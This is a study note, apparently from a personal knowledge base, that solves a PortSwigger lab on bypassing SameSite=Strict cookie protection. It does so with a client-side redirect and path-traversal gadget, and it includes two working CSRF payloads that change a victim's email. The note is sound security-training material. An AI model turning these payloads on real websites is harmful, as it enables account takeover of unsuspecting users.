---
tags:
  - PRACTITIONER
  - Strict
Link:
  - "[[CSRF]]"
External Link:
  - https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect
---

# `SameSite` Strict bypass via client-side redirect
---

- **Info:**
	- Vulnerable parameter - email change functionality
	- Goal - exploit the CSRF vulnerability to change the email address of the victim user
	- creds - `wiener:peter`

-  **Analysis:**
	- In order for CSRF attack to be possible:
		- A relevant action - ***email change functionality***
		- Cookie-based session handling - ***session cookie***
		- No unpredictable request parameters - satisfied

- **`SameSite` Strict bypass**
	1. **Study the change email function**
		-  Doesn't contain any unpredictable tokens
		- The website explicitly specifies `SameSite=Strict` when setting session cookies
	2. **Identify a suitable gadget**
		- Redirection in the post comment functionality.
		- Study the `js` file.
		- Inject a path traversal.
	3. Bypass the `SameSite` restrictions
		```html
		<script>
			document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
		</script>
		```
	4. Craft an exploit
		```html
		<script>
		
			document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
		
		</script>
		```

